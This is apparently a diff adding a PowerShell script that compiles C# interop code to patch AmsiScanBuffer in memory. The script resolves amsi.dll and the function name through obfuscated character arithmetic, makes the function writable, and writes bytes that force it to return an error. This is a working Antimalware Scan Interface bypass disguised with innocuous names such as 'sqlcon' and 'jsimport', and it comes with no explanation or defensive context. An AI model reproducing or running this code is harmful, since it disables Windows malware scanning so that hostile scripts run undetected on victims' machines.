@@ -1,0 +1,27 @@
+$sqlcon = @"
+using System;
+using System.Runtime.InteropServices;
+public class sqlcon {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr gnitse, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $sqlcon
+
+$toolplox = [sqlcon]::LoadLibrary("$(('á'+'m'+'s'+'í'+'.'+'d'+'l'+'l').NoRmaliZE([chaR]([BYtE]0x46)+[CHaR]([bYTe]0x6f)+[chaR]([BYTE]0x72)+[CHAr](109)+[chAr]([Byte]0x44)) -replace [char]([BYTe]0x5c)+[chAr](112+32-32)+[CHAr]([BytE]0x7b)+[CHar](59+18)+[Char](110+96-96)+[ChAR]([byte]0x7d))")
+$ptvnfz = [sqlcon]::GetProcAddress($toolplox, "$([cHAR](65)+[cHaR](109+60-60)+[cHar]([byte]0x73)+[CHAr]([BYte]0x69)+[ChAR]([bYtE]0x53)+[cHaR]([ByTE]0x63)+[chAR](7+90)+[ChaR](110+88-88)+[CHaR](66+22-22)+[cHaR](117+97-97)+[ChAR](102*59/59)+[chaR](102+41-41)+[char]([bYTe]0x65)+[cHAR](114))")
+$p = 0
+[sqlcon]::VirtualProtect($ptvnfz, [uint32]5, 0x40, [ref]$p)
+$jsimport = "0xB8"
+$jsexport = "0x57"
+$toe = "0x00"
+$magica = "0x07"
+$gathera = "0x80"
+$hibida = "0xC3"
+$sqlfinish = [Byte[]] ($jsimport,$jsexport,$toe,$magica,+$gathera,+$hibida)
+[System.Runtime.InteropServices.Marshal]::Copy($sqlfinish, 0, $ptvnfz, 6)
